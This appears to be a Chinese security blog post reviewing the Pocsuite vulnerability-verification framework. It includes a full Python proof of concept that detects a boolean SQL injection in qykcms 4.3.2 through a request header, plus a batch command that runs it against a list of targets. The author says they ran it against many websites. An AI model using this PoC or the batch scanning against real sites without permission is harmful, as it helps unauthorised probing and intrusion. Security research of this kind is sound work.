# -
PocSuite是一款基于漏洞与 PoC的远程漏洞验证框架

关于pocsuite的使用
0x00 前言

pocsuite的用处就不多说了，早些时候也看到黑哥和余弦大佬在微博上说zoomeye 和pocsuite升级了。

结合最近自己在审计cms，也想收集一下其他cms的poc，比如chybeta大佬的cmsPoc，还有Lucifer1993大佬的AngelSword，用pcosuite重新写一下poc，同时自己审出来的一些"0day"也是可以用这个框架。

 

0x01 文档文档

在大概看完文档之后，说说感觉。

pocsuite官网（http://pocsuite.org/），github地址(https://github.com/knownsec/Pocsuite)

1，pocsuite升级之后提供了一个控制台交互模式，之前貌似没有？？不是很清楚。



 2，pocsuite的强大之处是结合了知道创宇自家的几大产品，zoomeye和seebug。zoomeye能够提供大量的可疑目标，而seebug能够提供大量的poc，这几者结合真乃神器了。

 

但我在用zoomeye的时候有个疑惑，Seebug 搜索关键词，这个seebug搜索的漏洞，是平台上全部的吗？还有就是假如是metinfo，metinfo有多个可执行的poc，那么是全部执行吗？

在我测试之后发现这个poc是来源于你自己seebug账号提交的poc，你有多少poc就能搜多少。。相当于提供了一个云端的渗透测试工具。

假如你换了系统，就不需要把之前自己写代码拷过去了。直接下载pocsuite就可以使用，唯一需要配置的就是你的404账号和密码。



 

3，还有就是提供了给其他应用调用pocsuite的接口，那么个人也是可以利用这个diy出自己的批量漏扫。



毕竟轮子已经造好了，不用白不用啊！

 

0x02 编写poc

先说说下载，可以用git下载，也可以用pip安装，都很方便。用pip方便你可以随时使用，无须cd到具体目录去，当然可以配置环境变量以达到pip的效果。

pocsuite poc的编写其实并不难，按照文档给的模板，把该填的填了就行。

pocsuite poc提供了两种编写方式，一种是python，一种是json。个人主张python，自由度高，json方式看都没怎么看，完型填空，而且都是限制死了的。

主要的还是是编写verify 和attack 模式的代码，需要尽可能的减少需要从外部接收的参数，更加利于批量调度，也减少了用户的使用学习成本。毕竟脚本这种东西弄出来就是为了方便。

下面贴一贴自己之前审的qykcms前台的一个盲注poc

复制代码
 1 #coding:utf-8
 2 
 3 from pocsuite.net import req
 4 from pocsuite.poc import POCBase,Output
 5 from pocsuite.utils import register
 6 import random
 7 import string
 8 
 9 def randomstr():
10     return random.choice(string.ascii_letters)*5
11 
12 class TestPOC(POCBase):
13     name = 'front boolean sqli in qykcms version 4.3.2'
14     version = '1'
15     vulID = '1'
16     author = ['r00tuser']
17     vulType = 'SQL Injection'
18     references = 'http://www.cnblogs.com/r00tuser/p/8044025.html'
19     desc = '''The vulneability is caused by filter the get_ip method,
20     and taker the userip into the database
21     '''
22     vulDate = '2017-12-15'
23     createDate = '2017-12-20'
24     updateDate = '2017-12-20'
25 
26     appName = 'qykcms'
27     appVersion = '4.3.2'
28     appPowerLink = 'http://www.qykcms.com/'
29     samples = ['']
30 
31     def _attack(self):
32         '''attack mode'''
33         return self._verify()
34 
35     def _verify(self):
36         '''verify mode'''
37         result = {}
38         data= {'lang':'cn','name':randomstr(),'content':randomstr(),'email':str(randomstr()+'@qq.com'),'phone':'','attachment':''}
39         headers = {'Referer': 'http://' + self.url,'X-Forwarded-For':'test'}
40         httpreq = req.session()
41         httpurl = self.url+'/?log=post&desc=feedback'
42         #first req
43         try:
44             response1 = httpreq.post(httpurl,data=data,headers=headers,timeout=3)
45         except Exception,e:
46             pass
47         #second req
48         try:
49             response2 = httpreq.post(httpurl,data=data,headers=headers,timeout=3)
50             if response2.status_code != 200:
51                 return self.parse_output(result)
52             response2.encoding = response2.apparent_encoding
53             if u'系统限制' in response2.text:
54                 result['VerifyInfo'] = {}
55                 result['VerifyInfo']['URL'] = self.url
56         except Exception,e:
57             pass
58         return self.parse_output(result)
59 
60     def parse_output(self,result):
61         output = Output(self)
62         if result:
63             output.success(result)
64         else:
65             output.fail('Internet nothing returned')
66         return output
67 
68 register(TestPOC)
复制代码
本来用的是评论框来检测的，后来发现用户需要输入的东西太多了，然后改成用留言框。立马方便了很多，用户只需要输入网址便可。关于原因请看我的博文（http://www.cnblogs.com/r00tuser/p/8044025.html）

代码很简单也没有好说的。

 

0x03 实例使用

然后就是用这个脚本去跑啊跑，测试测试，修正修正bug。

跑了n多个网站，没有几个是可以的，心都凉了。

哎，鸡肋的洞就是麻烦。

不得不说pocsuite提供的批量扫目标（1对多），与及批量脚本扫批量目标（多对多）的功能是非常实用的。



1
python pocsuite.py -r modules/qykcms_4_3_2_front_boolean_sqli.py -f qykcms.txt --threads 5


用了五个线程，16个target 秒出。
